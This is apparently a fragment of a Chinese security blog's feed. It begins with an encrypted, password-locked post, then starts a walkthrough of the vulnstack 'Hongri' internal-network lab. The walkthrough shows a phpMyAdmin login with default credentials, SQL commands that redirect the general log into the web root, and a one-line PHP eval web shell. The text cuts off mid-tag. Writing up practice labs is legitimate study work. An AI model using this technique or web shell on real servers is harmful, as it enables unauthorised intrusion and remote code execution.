7cccd2787ffd4519685446dcb2ac01c68081fc21706d93c192ebb7d01afe03523f425bc3d356ff994771646ea3ef5fe93d148c2b138e0b98c8d92c830b0133a4a3088604e0e89b4a4cb5b10cbd7cb46f134a3b58993d29bda68eb38cd7794d2929a1a6dac548e914e503c148bb286f30f8b535fbc3bc2abafad00a8b415fb20575fd6b38bb80b24016a1071e6cb7d87fbcfa82a8e61d9862eed2c7bbca1e7bec5e704f7eb860af927162a4ef1828af4bf435877263af915f8cac47adbc2ac69cfaef46b3397ce98382298c77a2b938840260dcf1373855ac8c751fd316c662d78672760113ba3a8967817e6a676b0ade3934c12ef1c8e2bc5da19efb74f0b7df9c2c90793b28786eec0f8ef80f1228550e248c8dba310fac142b04855391a4e3bb518b698603f2a06ac25f7e51da4b7c69f089d43fc3b5d37fb0341107aeab7d38105edfac442e42674052bff9156176163e4a45c1fd69d511c8c88f786578804ddbb308bf514738624ee244c7c2ef2b41e39163dbae3b785f4fca5770e3e4286a8a784e5c5e3c982fdbc8cba34f3bd7198bae6b321da4d0ef0d1347ba3444c06ed1541ed36984ead64c2a38034c8279f3472e977943626c83bbb63492156d65af2e112600db5bf2a439d000d5f9ac47dc03b51f12b3a1a148873fd9287a63399e0b9cdf5c9fc4e3706aa9ccf7d1505210664c6694b634c7b952618dc5dabe758d0cdf0ec982611f4ef943baace02f7315179361e32775ef4eb6d369f529aa46fd191b4054add1d88245b25ba2b749fe72ad493f3e863368d9825aa9ade2b6c573e366c5a8d16e4ee81d737f564e20ce7a408572a2f43c84a1193d22acae4200a52ef9d7fb04f3cbbc23ec4f8a2f40e593e299056958e1cdda1e7f900ab97a0a8eda4c00b7d8a73bca7df519bd2cbe3f39cc2be0f813dec24ea83832cce2ea7082e436c1ec9f9630a9be608e64ed515a4b28e664d9701e1aec7c9bc42b3b37eb03b623329d362a962679a87b7aa2b4a85f1f5bcdc96f47f331a9110c7a513ba4dd6bce8b27bb10dd87ac4a4ad4824349dedd3a9d6d0a44f97c77070c8428915d8b5cfd25119ca05dfe40bbfe391fde8680948cfd0df493928e2292d099beccee0624e854bc624a1d6484b9e5fde65a89f6f6d63b64fbb4f90750ae024718952c4cfa4fe6b5938ef8589adcd8e78609f86d024d18de41b377236c0d789ed53cb480b2a96eb93e835150e549c07537150f73e08d38ea2d21a5da0d16449480c6c07643ec8120a6573ab988389c507c9b40ce0b436bfa233abdc12f059479e921715e0fdf32ee9392eb79dd09e85b067bbf37465026cd659831832cede388992e22cb41ddba04149b3323503889026d2baf3398332ac9f9c6044daace5b843d1378cd6a04b51aeeb7f9383fc96646fb98118a33b88e0dc873b0bb087b4b92c061d4a72e65808ecdafbd09955892d815bb40a4630d45f9c67b40fae534a795fda0aa5c78cc5c6d4e0eeefa81dad3713364d4c5afc5c306b82283b6265021940401e63fcbfc3d16641ea1a0eeac02803970509c8dc05312aac6b7203c283dd25aaf00cdb1249bb512c67b8f4571d23c564aacae3e0ff8ea2f02dc64d5406bf5731465f2a37ad7b16c7df603c872dadec834e2a1fab2d2fee39e77809669cf638b391ffc46b2dab61c5939c3b1b1acdefeb0dcd5c7ec9a9ea7b1fca7d1ceb0856e98aed5ca62b74af0b16f2811b50cb8c3659c767e1ca3ea6535f252086583b277f5674a9093ebfa2ea752b5eb4a14c23d545744cfcd6a0cfafdb8840f5f866bf04f2262f164d62bc111965c21d4f9f9165f3bb6aa93aad17b8429f2b0424b328e045be1d5d36713fc00a6204fc4bee50450920a7726dcde4e3f6ea8a3b4e21008c18d877714839c09d031f6846ea664467d1865ef4e28d9a0712a23aa7b2fd076b0a4fb0ca9b9638c78a1ba1b32dd1d35e35140f7c93256f178227baa09c5c3ddc61b77bfeb47ac693240ae2b6658984e60881e62fc3240839e3a33ec003f989dadbd585cb0ad386d3c4ee81f21555c2b495416341e5a9672ec093dd6bde0869e87fa25d643f90e55fddfc20b9f3cd651a3bbf375defd6f6f387cb34bae1206b21af2a139459d4d9ffa3d9232131883e7a8d78e3a351e19eb12e2f09d9f5b4e601ff0fa10fe2dddcf7063e6f87b666b009a09c46b58b023084a26a78bbfe7b8d73a4c1857f74c5c891593fc306662945f09021008170cdd3ed6a2341108e4bac3375c59b7fe5537376a182de9b8e42619e42bceec0f9dddd6f9bb21d9734314b398dd3b3bdbc50a20d23c134f0dac9a40bd41859d61f5f5bcf55141e8bdc3c6699f2ae549a9b6eb8bd0726f02496086a9795b3d8a87890dc844b6a7d7ece565f5a9712092a98b1f23f0e5dd663e344045b52740ea8ccf2dd2a0be0e71283dd0bdab52c4bf7e59a51edc6d8080000a6fdf91a21e77867f62e0e699f492d3a94bfe7808b77bf4e9acc6974285f0f023e9c92c89cc70fdbf6f6bc5d1ba1219866b8b0ffe9b408db6a27e075b66496d365208b3d817a57027e5a17ff2e8270402371cd271c163a83cc3b66cf3d5cbb98ed485e1338eef90212a90db596daacf5da48578f22a5b0e2a63b8ec4aeb464be12bfdf0bc1e83355895624e0f89b046b3c7ec6b21c1ca925f4ad5f356dc7bd730dbfe1388a803ba15e5c1d48b19d34ee42430918f1d7e85c8336e05830d7315ad813dd7343165fa0316f6b5ae52d435afb8eb1caba0fdcde8d647a6758a9cb3ef106c8bc2a1d5efef52b96e7765d4b624b9b1fa06fd959c6b18000f48c9effe78017775a464306c72e53e364d8c1f8c0b163325014d2ceda4fbb3171f0990226cb0fdeaa4716952ed2bf8c54bac8345a2217bc530631c8c1aa041953f7bb5320b2c2b04ccb6de05bd89c07a022d81dd64232b9e98c2f0479a4001cd4dce0d260a758a11927203749bc54678c9b9313fd4c2b037be71e7299a3d2acae6ff9a2aa5e680228d5f09d0e340d64c1bd0232200255bc9b9e333cad2566ae86f988dd040edaa5c1265c258121700aecb274e6974c0c038e094104d95ffb97140fd6836b6a010768ee86a9476e99bedf9d9bcbeab8eb5027ec6daa5d9234fb77c269991362f1a763589eadfad2f8083b6a7370f0c2383fc80ec033b49d141ae5dfa7bd09db6e94ca906c722d93ea069f9b0b1c532da2e94f60f7780674aacf3e32b2bf3c6be3e12da923164cf96260538c1959856e3b380abdf87a1cbc7ae1ada604fdbb4c7d2373a76fd26d334fb0668c46876111476f238ece5642fd178144b97a33bf4a96de10e8e3e6c30a21abd88d94c052c6faafcea51b5bceea8c899c43a6ad7a3265a292c9f8c930b34a45ca39c87771fd69416c1f954f633b9a56df7bc8c7ee2e80b3a635c8c59bac7b026d87a935ab92f41b6c88890445661a325a93a7238d86bc35fac0398fc80dad447754b3aafaa65a667893b8d02db0492805fde38feb2909263459a2f5e09ea9e0300df22a5feed3a3e2013faa1b751acf031602711df8a531df54dd5b7fe1a87bb1ce27fc94e9100b874bbc5ccf10e2a74c7566c799366ef3952225eaad2e58cdeacb2e04680ad93707df703b27e09ce6a5733ba18aec66780e618fe55b061708297e405c8b1db6e3c83114f7201038c7e8dbf29c258594c79cea644aaff07697c7f1187ac53c4489e8e1146d1c484148986f7bfda1d72bc93ab6369ac11f303c4958e5abd85b89c21e83db556df6d47e7c086f0e178fbf05a817a3df8605a8ef66ae8bb1905653dec7e3079be91ca09a0547c42ca9d3a828c4fd3fd489bdd2db4ea729ec75e527172dcd62ba52a41db9f6ea9d0eb0a11438deba7995bce6c865a3d21c4bb9536884b998dcf25e10c0c7a1ea04a603711a09ac551ab1d1e1e078d53158913c118b1e23ea8af3ad991d67f6802d601eb6f44c5811f2e41ef03807aaee7f146d7194575481a5ad3ae99eb014364f2a06b18d7b1fe667850e079a02c28e5c94abedd1ddddec89cd5d1e82d7ac29455168f1d6e2ceabd9ef7a9c3eca9940d26ba48b54e13697d6111b14076d0edef4fbf78b768b204bd7567e2e58de044fad793999898b4e6a232334cdfbeb43c61cf09315a74419818a73c96b97d37f72d26384b10526b82c77006afc7f70adc1cf5e03882a2855dd627ec8662377f7c5f5166465ed081a20b988affe3b20ef217eebe33d2bf2a88c9fb0036df08dea9866a24f90e2a43044e5938def8906ce688f7dc2be8cc58290c407029674486497f9f68d9bbc99560ca2ce97af2f3c234e301e60e9d64c806a2ec62ecb38a5cd8e47314b87095c4302ce82f2f26dfa6e23a7f8f81a5af3dbe411259cef794055232715d7e16fc40c1a75f47c0427ebfdb718fbda2b1cae1d1433fe5274971032f2d2ff153154f7f3421cc5a07fa34dd65cc9719318518c945de5d6d524a0fc3b29874834b6ab59e00c72e7abae7be0592b0096744ad1d83086b33113cd7c084681f5c32c3a36080b2dc039c6d88bd53ecdfcd9624b40aaf1cd71a0c654ecc5b72780b95b68789c04b2f1ed9f0dfdffa024d5cbe33709b6c0da4dd07fd129a264a88bb22f83f217928da41ffe774567174dd28aea5184dd7ba15a9d448649ecdf47793eb849cc4fc92c947a7b1bd628947754bce06968e4f7595f6bcaa83c24d4c62b1cf8f5edcdb0a1e7ec17e9bb24faabcfc02b85f191a7f4360b707259a00050c27fdc5641b072186ca92cb8bfea3e65aef92f41652321984466b10a3ce3838a5dfd50d9f0ccefef31949d405f67c9b9edb9a09af567478e95c2a1e87de7d2e0ef3b3e193b13c96fb7f36105edc2dd2b8afcbebb3a75574cbc1408062894bbdd85c9067e7bceb7e1b2d90ad33aebd30bcf3c45a550894a648ac6c146908d6e7223fb2f16d7e6e0e2bbb5f7c97f43b20104f15dc602814802d2b408123e176d64e5aebe5f5abbde5a84dc8807ef8a3425b310ed8b7dff1e2c9f52960f3089a3da77f624b82ad0512a9b3b3b5bd2f857a8ead146dea1c3542a08df12392db0cee693428c0c593317c684f7ee128f0b54744694ab7fb68f44f2b2a4dfc0affdbfc700dd091cbbfa7078f7b04bc3742b9f43e914fd6b06acd8cded3a5ead6372482c21b82ca400ce946e2f0f2a9c57c5961271bb0fb0e268cbc32855f02a47a7c7d5f147d5aa2036cefbd03c13541b4ab484777ae8ca50fa404c13ab16f957a0546de6b689d34d69adb4f33c461751e4e6b3caa3398ec534d86b53b607d3fe1e377a0fb02fe984d08c0ac483284dc53a810e4c85a673040f44a7d228fc4c43358b7335a87d56885924ea14f3efa5822c5a6bb45052d6edab55087bfb74bda074876bc910641e2e1d949b1abf7a23ac913d1d5afba3643197555c8956e0ff2e12a888bc76996a9240e22c2886df1074f35f01415c5c220f455b298ba21a0d19cc755196bb42c38a9147f5787f3ca35b9c68b58fc065df191db4047745ba2b32405a585c0fec40dc84b50a399fed2b862309a0d63d905f517c49b29722cf4da2d97e0381be6ab46749b4f30fcd9c9558e9c35ed5a730b0f6ed7359e4231e09e7b46f8424af30ed80f246f62f7c79836f222ae801cf9c64ef8335f3ceb4ae243339e102b9ff60ef064dbfe3fb4ef636b04d15f88f26b287b66c6da2dc26494dab3b597861fe962ab5fada33f727dc0e3a04d34fcc9922ea5e1a44590f86055f2561a212a3e1bd11f6cf41785a9a91de8b3510b29e093ed0ac4f6b6d76b340334ec3d9b8490ba6c53fc7f39a12cd069db1a4e48e0977ff7fc209bae4898ea66eee93db05fc7ae34dfa324c02f39565e2a687d2c3c5e1448a722a1d8deceb29da81a32585a5aee12720cf2e642c902c9d10cb19e93be2771d851aeaa8f64cbbcd7872cb3b59b7d1046e746aa7af2b8a97b9f007f51d873924878e573361c88cbb2862470d67b2523ac0178fcebc077bd3b91a35e948a8c0c3e86114262e3077f14c4aeec2473ce9f86b94ddbc18eddff6619000e0558ab85304ade8da189bb5446dfd6b7f027df41e1f8bbcddbef2c2db3ab9104c818dba92c83246b70547a4fb7a7851ce98ab47e1cee530901b7418ec0715ebd8a6b4825164075aa8d0a2365c4278148ba4d6ad8df0ecc88feba397b612b82d4ec54e9b05f0355e19b666934a44f7ff40b1489fd673e6d293b177b5a45b14e78daece234fbeb1b1946e67aad67e40c45b3c4f260c0d29e97c4fb75f4875f5abba6e415e76f5b132ad49cd1b5592aeb0fff2aafff379e287ac0d2a34ef7f53747bdc37534fb2fe1c0350ab4503b2aa5e323225428341cc3a8eb8d781cb83717b7de1709640486d914ed6545eb85436ef229f1b9d4fb41c0e1a2adcf64b1527081ca7be8b4f82833b58a6054126926cd547b4f6a8b26d7009205b6be1875c6ff3293244e3fa4cde6560f2cd156d9a7d6ae16908863b4b256f1bca189e2ed1e26e9b3e06a0fbb71283a1a3a0372e0c021a1e182a8dbcdaba1886e7e3fbfc1e9093dc170bb3199901e129c0f37ee08d1837d81581eb98a07817add7be07cf2c7cccdeec7cea8eb17ef5fd9787e9a6009e6a3425e2919ea06f181ae49f36629413df74a6e1cd3dca2d7a85a17887b5f35ca1f3c3600467ddc86f29ccbde7c4559e5ecbd731d88467f053995d293c540eed2df4442d1018c870cb811a25312fc03f4e845ffb73b979b217603394b30b1e30a0fb917617274dcb30ce634ff6c347b6e3f322827b07b4de8a628a752ec4320d20ea5eeffc48623a54b45b4c7a2e0c3031b7e54dd27c8433b7c12a576424b203eb1db16ba59774a589a78b4d8abf68deb2d5885f669e56f0076795f3805183e7aadffb3b69b672bc622fee549a14d0b847ba7b8ef57f2c76f4d256737be3c2d20bfe03afe4a1e3341136bfeeab67de08bf67701a1dfac002d960f427f741d824bacc8bde530641d8dbdd407bc31101c8b12a19d1d34f69f107e77d0fa74c8e4345203e1e636ee3fb52b2d70a1790a72091f961a87eab58e6435fcaf5d2a6b4d12fa9e04879f38e99c30932f0c242cd1398d874a4d714a645ef911e065ba7600f8c53c951fbd8991d60409bc9ddd7b17070d0cb74d166ecab04b1918ca212cd7becf0d5831d2053e473c9849476667a43542220cfa7573ce0404bf1140cccd7fe4282de986fbb3b43fdf1b75dd8c787d60b4e15fdfccea4e8fa56a2b5c663482d3a255ceefb7fcdb249a2f6691a72d1ac66de89905353463f1d53bd877ac33be9250209be6ac4ffe7e5d5ae77c56cb4dde9daf50e956c64f5b218ed45c472e96fe0bce3a2280978554e8d7345b4bc8daf17743c1658e3ca9cb0b67066e25be2821d9769bfa69919dbda451d1a73b6d327fd29b6ca1a3d2d1b7ab63062f056f426142edb3b52f4278739627c3cb8c50c84be4f3104e2c026d34853ff6226c2262d5249bfcde689b0d1461ef1b6ae28e26464a02c45227e95f9de52fa1c8ee4b4ae69b88c9171a6d98f47f0342beb4ccb457165df97261feeb5ce2329042135f48d219e4cb99c22f30591ec58edacd4a97d37732ab117862d2db37da8228dfc5727b52c2a387afb091454ac11f2cb1f3130518ca234603b85954b1ac327292a22fdf7e3c0ee125d02f7353f2b5a2f60a37f9dfb51fae2015875f880d86ec90ef0f900176084fa0e1a5d98fdf2ae3befc124320a8ec64145c9316ba2ce40f4383dd6ae2e99e6b3c04abd5ecbfcaf67d47e7c8ba8785cfab23cb1d37f493344c9b66d1a258472d7df03ff371e3e2da7349d671b6aab271389ba862b0bc29879ae857ec8a555adc5c81c8f375f172289d8011dcac14f0c82dc86c025f2d487331c695ab4d151c4e6bfc1f4d2972a7439614e24d16061115a2e0e076067b213b07dc628dbd019b00a02de7bd91a66bf65b0db78a52ba653bdeeedaf6cea19adfc9947619fbf97fdbe3679ec905b1c3aae8ee6a49adf5e0253dadf9573eae14477da6868394ee369b25021ba21e72928ad6a22f83026d0c399e217cf3f7edaabb0df2fc2f5346313bb7a29a7df278a02236718399328a5b7990d677a9ffc6dfa28c949dde67917f55adc970700118b2aad882b3afdd320ababc4d3bc36390597b1f449592438fd7972654b2de63c0e80d2f6860a681527ea866f83aa59fd997788a1bd115f12ce0d779d24d28664d8c53190b784a285c060165abf93e55bb1e61c2235ec8343711bb24f443acc7efdd498ac3eed98f4e1cf4e9bcb1222c59b83c229973c1dcf6eacfe38d6eeab1c52c8a178208325a89cb3eff474395abbf8a332e8c0d3e3540d8a997d0e0efbd16a376049f05bb9300f63afdaf7d922781c58945517e8ecdd818484febf2ecd3ffb67b26842f99150bcdeea7e7309a5f36772f7437fd8401f6a055dcd795bc8d0c6451b01edec3e558f1ce306488b5f0fe7c74d17c09449c92bd4fd6e82b9d325287f3b44b0b7d2d3a24947a8a0fb1866636f842b1d7fda7e8984a057f3fba9b9368f6eaccfeb9b0021076ea7ce8dc147ffebc7e873ce1374d65fe12ad0523fd3665f7c564564c5b57f32d6e6304547f9f5261edb5bc45dd7839c93bc45037312fdf1b83fa17a18baf4e9e90d5969d263ceaf2f4a37e31de45fe9218b9d37e4ef0721a7af3a02628b393bf6ff4aed54627f4bca7180ea98e62084263921d3b6feda24fa5cb91e4f5033f2f4ea6a38460a81717379d01b27e9ea2c68459fa7549282c37032168a767fbfc6484ebd754b09c54bc6d5789bd164243e653f73819a01cca6e516c4087d023b82e99b1ed59420df6b46676952cab8ea917b972db8972965147ec27709400a684023eed29b35d3d68a97a6d0517fadf241c70b08d519c668f60d19d1f85637a8b41f91d74a2cc97b23c0a136526a782db80d902d4bfe92fed6ea77fd01a9e59afab7d1aa6d6ea104d245dee8b6899f456daaed17b3b5c647a5c4bbc49c78abeeff9500beb027aa255dbc818732326079e7ef7153902e179b01ab1f96d23687af0b3d2b8a8b8e5d44d8a139ea3a626158e3d95665815edf45fbf9a580bd118ded57485ca3f25e52c43a7f46cc122c3fd41f03d7cd81a0aac9a4bdd4813d823fd39fc9faea9fffc795ec75188bf7210f09a973cd52f1135ae5a4a8b189a7ea7fa238ff6662645163167264c1b489ae81618a57b1f84f6332086d4b384c766d3b38308d5e5edd8c7aa8c968334cb911d754f32467a33936c5d5787a5ae7db5333229dd46cc47547969fe15199f4e2703ab8fc6676bdea4703cc063ceee327d587bbaf15aec26aa941308b59690174366a391e057b64b6621ad8e86e81251fb0fb4ec882417467a9041a617f78879d5584c92453e796d08fa6bc71a127dab4ab3182de155b83cac64a43c5b2096ea7cc8386a252151671b549751b7d8b2dc10eb202dce0f9f09c315d445569057764a796192d9552c67cf54a7f723f60afb617ea5a5aec02873150f7b3796273193f7e20070c5fffac95f7cd90a7161c5c78e10f35668d2fd6e6083acde6cc7d62178a26b7dae3b50283d82aae1ce32a6c4dfd9732dfb000c68aca75acc7f13a2a7cea288c41b0e36349945c565b4e7ec7a781ea1ab07cd91e569a9433f802958d778e62a1721f09a411e66ede680814d67b49bc49a75756c2de72c18855689eb19c866a0cd688ee481a00abaf8c1934948984fba5326f510ebd2e1e94a6ef51c0f3957722fb7ccd9b7d3f13dab66397f3bc886626ec834d8eb774ce16e04c4455725f92c11356a2a38be1a535a4f1034f2eda1d4634d15421ed7ee38c3fca45a0378e44f233b8021c0091285f5444380f653989dee79e023763c2603a1671784f0dcc73f15f08eb4775e44272b3ff96d5fba7a6746e601747f1efda3b984f1961fe6ba3925ae47dc07ee158c51fed82ef4d45b137f0bbbe00ec570975aa7e21da750be5fdac0f262fa7717945cc5e64ad689e00242eb0e7518e3e40c40f58bd0d06e243ed67996fcd0cae55f7df5939e113fc893e9218d86031f7b19ea49d8c01bc5a90c178f404edeb7bd88f2a46595b4b5ff6b84c0414b46db86988aaec281fe4e93aab2c2f74c59fc6ffac0d27f45d2f31ce283fb8f1ddcc2a9b70a776eaac3ab2ae9e6524055e123b2f623828b6df9b81a1f5c7d9046129591b8109badbd33c7aeea8681ad4892f0bf9b92a3cadd3fba06b3d997a27ab66cfd5b6d35b63134ab313d6a2c7b7e21ff95c0534986828f84940ee48d33d8c0eaccce4718a2735ed419e90c29baef5b5c876dc71ad95d6a98cdbd3cfd92bac4ca7c6c4931cd5d8ae24d118d695e9e5d9004b74e1cab49704899384cf0f53a3144e508896aed10a50ef617f75df132e53158313bee5d5a1829310479ee0e4652ef5908e971a21b4dd1bf7696e8fcecea4f5c78abee2d27bfab84d0703bd51e412d130576a27f50658d3da172c1be5867ee3bb42d88099f7a1e56cbf50a954c51c552ab4f889681d81b729d13545e416d6aeb930e397f7144347c45cbd85ac195d276015a231fcf32752c2463d1ec4c0cc6b2e334f3a531e1f8774a2fafcdfd8b732ab7b012d614836c81236a252e6fd7a0973a870123242fe8e396732fc2e178477c8be123686a9009b7046c8741fcfc8a836ff560313d3eaad557e71497d91a4b1a84d1a10b4d1e198f294a8429cf4eba2efb2429e2ad6859c3ec239af6a95e16ed3c7713a2e27ecc18d2592f2b024ebd098789988ffdac37fcbe2c86956a70d43e377f8cfaf8619ba207c663662bed318c3a67bc2e29b65cf2e423a975b0b88657767d3c81641bda93b6a8bb13a3939a8f7c02ba52f9f286bdfa58d6399750a363082978c3bb6a4a06272ee2f5c0df3e1137cd621412db3f24cbe4f27054898f3a58c466419065c70144b1d46911d6392ada2c5a979e5353a6fa09287f4f650534358dfbed921c54b32c3d18efd136b606acc76a3bd2adaf4fdb3d84e47cc95ef038964ec209fa6950d246ca7be467c99dd8be1aa2b71a7561262da1317a1e5c7c1f6326aa86458923327b01151e618df272c206dcc18ac68960cedab11ebb8f047bbcebd2c4a77d9bec54f47a9ae69ddee7fb97c737373703bffa1c45b5a97e3567362d97542ffe4f0effb887a522d29766c0e4e292531deb335fc892afb36bc54554723899acee21b258cf9864a0626d1f3ee6d70b71178b73d13c3253f6732a408bf091b0a18aaffc8a8c8a9b19521fa63a102b06e8a771bee192e9c43ccfd675fb13abe1484ba79727c791c2397c760b362ad18a7e36f1d14939a39042344823769c1368fb73ab6f7f008dc21dccf568b2a890cc1e8b564f009a33d8fffc467f9d62fa25d032c9382432156ddfb71fa8c8ba5908d281b60e5ff6b904238b078c0483b4f16bcb947b2ceae2b06122e2d246f6ad255a9ddcf4a0b85560fad2223e2221c0c8bdf463abb57355a71e6c76849ada99b99d51fad5af7f957c25025de188130a116422cb3a3bca00e7988eef52aa3effdf8554899aa2f3645d2ff33930af5102eb02e7892f2baefe595aec6e9898a9aae7516fb2b86d9ff7f6f2ae29f8012940a20244dd4be568ce4e9f0b5000c209f17381fa6e9f9c977973829baa0d3bdafe24319e6b6efa55c55ba967305432382dbe85b8d9b3c4a292a124b4cdc180366ed3ef267b5631ad2ddd80e57a4bbe2737cd4265d1eb2e455af3e3490372392c5c1fb2abcc0c8636ec869c866846fa7440349d528c90bcc39bc444d1b333e3d852c02fb8b8914a6af84682b25c7c1923a4e201cb920657ac43375153cd5942ebb97ea8ebe2e02c4ddfae8c5c781131cf48fb28c0b25e17d9cbbb22bee930753f41482432193002d35921c3852d0ac3c30580bda01f9dc3c38b16a9d6b3891f6306e998919e3e9a9f9e7c8acc782d75599198b7567a7cae404f4a1730b9f576d0274591bcd4414bc142d7e856addcaef8f5bfd4eb91a40d654dcded2a9138abfdf16766cac503b799604b3916a04bf67e21de288d94f0a1c434f71399f708edb8ef6a6496ac4566de631c8ed6e9acf7f9b82531a8a9f862983d02d0652c156edf650626115448808b3f75659f3370040a9940092f20c703909cb9efe4209f261e453443cd934f92f08a1f04593d1efb6750da8e7bf71c810107f2274e22993d14f14481ce2922e7bbbfbf50ffba3f66854ceeaf8e009c92142b9ab2b8200e60d20a0df88e8cd3c290949df4197da2f8623a2ea9619a1ce2b4941b756c31d14b1deb24beae5988b07ea62ee6209a9bdc131fd5c011cd35daa814c03ed9effce79601e9e282f503746c628ad25190747340a61dbeff9e3fc64dc76545326e3138e5d9c7071ab4c374ad64834085ea5cefacd98a6e4033d34ab5c21f0705b14a5c97432adfe964bbd6f83e2f4ead1c666d7e0c79c67282967a9aa2114e9a23a60b253009a1910ba8a81b44873ff4186c64ec1db23a1d29c815c9b409e6f3e28372a513e7f5afaf1a42a445013110d9b18033edc15761e11e0b6c8719efc284f7009fd9a581e2e5a4b4e5ada069d385552badf43e107dd6dfe75ce053936118f7dc7c7f03be8ad63ef00812b50a671704d2ad7fdd7029956bbe0c009af0bf5b5fd7b7c393d1dfe9e1683a1c9d917cfced2b4eec86941c950c65e55500818cb85154bebf343d22fae0d44109eb302c0c135cfa652a2e9a68b36584ee0c9f1b76b2ce2827124c86c63d05bd54b8f701a879713a95c5f86d09a71b9f55b38e7b1211398563f6c66d1c1efe2f7a6312d4e7b8abb4c3f1f364f66705831fad8468a28d5c7b8da11a0dac0ac2f7693929d44bce94ffb247b35c997b2375e8ad8873f6d9a6a97a044e20dc4e2675f71e3af36e15554e69704126f1d6eb338d3f132f20f675229af69ae880d712effe03516c50a00823e02dea2164172f1ed131d48f1e4b18fdf9d131751fd66ccc193f4c4c19a65b48769b9abea8d82144f02429d6a89b9034ded4c24310d4ffe9f581f4bab8b3a1191a66848658d802cc94248e010baacacec98c039df9f11307df152c8a2eb138bf3426db6f3b758f3eb6ee76885737a67ce34f7b4f3f04aed63b7ba29fed17b70a7692ac9217f570c3bd768c7de9378b6799f34e22b71bcf886c248144bf91d9c9c000b31c179ec95a381d66fc5a04510d34c6ffd510ffbc91f0cfd906294c9624230f400c7e29d584e5063d4c99ba9a7065cb185b0b11b0c1bd249778023fc36030ded365ec805c1460d1dd812e45783081098950a97ac586de05d926bf4b06aa49767d462e569f55f92a4ee03c756f78f0cf1489676e49c0f9e2baeb6d9d11e3b4d885b59f5d2b4fab032197ff758191e8bd8dcd2365e88eb63aaa988e32bfcaea09e9bbcb7b659e7b28f66ba086b8b65a625c5ce6949cd3d12a3a79b8369c1243e18a6db12571aa6920314f1ce2fcdf54b3b65a1b03642621108e0c603ef3bbb96285adbf3ff5a2d87bf5414b72ca8da632c15636ab50369c856c5a0915de4e96ebeb0fce6d217a2943c90a24b56bf7380dc38e8744e2a3101a5c33a85bb1689833547008f7268246fc090cd907e989d78ae39492cbf62f9a6188a2c2db18b38e180dc3c6cfb505f97224f41d0aa655f8eec4b6c71b3b44a5cf1483e3e099718429125615b4ed6e471936d53dbe1f598c62165a49e969d9c35867862b1c377027c123cd7c8dfe70a420e81f8c2536b3ad59c4822ecb1de835593be231288e3b262fff40f79a2c3af4b620ead37f460370438dd92b8061d72a79c94c58ff0609dc6a33ba4633f6021c28d259a7a0d6b6d1ac755301a8f76d7c100aed8d48c3684fbd7f4f4e2886fd5e4bc2c8a43df00f6c6cd15ee872227b91c3702b7b3dc715a23237e6c9510b81bf2821081ca86780155f3408cf739d64bd99d0479c9a17af24c083a3962d9e1b80c2f65b93a2a8a97250fab4f516f492771c9a4c6748b3f01e5b4b30bf1f6299ba6dadfb1ed5c40b8bac7fce841afca382b604592ed6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>openssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机一</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/</url>
    
    <content type="html"><![CDATA[<p>拓朴图如下： </p><p>（win7为VM1（192.168.1.9、192.168.52.2），win2003为VM2（192.168.52.3，win2008为VM3（192.168.52.1））</p><p><img src="https://img-blog.csdnimg.cn/886c87685038405b9e50ae2350ef1336.png" alt="在这里插入图片描述"></p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对web服务器进行端口扫描一波<br><img src="https://img-blog.csdnimg.cn/e510f3e8ea8f4159aa0d26af50168898.png" alt="在这里插入图片描述"></p><p>发现存在80和3306端口，访问80端口如下<br><img src="https://img-blog.csdnimg.cn/e0cb1a0daaa943339309ad4501e4a652.png" alt="在这里插入图片描述"></p><p>发现是phpstudy的一个探针，那么就有可能会有phpmyadmin的web管理界面，目录扫描一波<br><img src="https://img-blog.csdnimg.cn/085e23242ba44da7bd687aabbeec2f37.png" alt="在这里插入图片描述"><br>发现确实存在，访问看看<br><img src="https://img-blog.csdnimg.cn/269742edc83a46f8a26bb5c8ae4ba806.png" alt="在这里插入图片描述"><br>随手一个root&#x2F;root就进去了，现在就是通过这玩意儿拿shell了<br>有兴趣的读者可以看看这篇关于phpmyadmin漏洞的总结文章：<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0</a><br>这里通过日志文件来进行拿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启日志记录:</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-comment">#查看当前的日志目录:</span><br>show variables like <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-comment">#指定日志文件</span><br><span class="hljs-built_in">set</span> global general_log_file = <span class="hljs-string">&quot;指定日志文件的路径&quot;</span>;<br></code></pre></td></tr></table></figure><p>我们在前面通过phpstudy的探针可以知道网站的路径<br><img src="https://img-blog.csdnimg.cn/74c91f57f1db41b78d1e5766ce43dcc5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1dc76c95286342c89fde493f004d1b6e.png" alt="在这里插入图片描述"><br>设置成功，写入代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_POST</span>[&#x27;x&#x27;]); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img 